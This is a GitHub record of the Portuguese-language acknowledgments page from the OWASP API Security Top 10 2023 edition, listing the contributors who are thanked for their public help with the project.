{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/pt-pt/0xd1-acknowledgments.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/pt-pt/0xd1-acknowledgments.md", "content": "# Agradecimentos\n\n## Agradecimento ao Contribuidores\n\nGostaríamos de agradecer às pessoas abaixo, as quais contribuíram publicamente \nno GitHub ou por outros meios:\n\n247arjun, abunuwas, Alissa Knight, Arik Atar, aymenfurter, Corey J. Ball, cyn8,\nd0znpp, Dan Gordon, donge, Dor Tumarkin, faizzaidi, gavjl, guybensimhon, Inês\nMartins, Isabelle Mauny, Ivan Novikov, jmanico, Juan Pablo, k7jto, LaurentCB,\nllegaz, Maxim Zavodchik, MrPRogers, planetlevel, rahulk22, Roey Eliyahu, Roshan\nPiyush, securitylevelup, sudeshgadewar123, Tatsuya-hasegawa, tebbers, vanderaj,\nwenz, xplo1t-sec, Yaniv Balmas, ynvb\n", "timestamp": "2025-10-24T22:27:04.513608"}
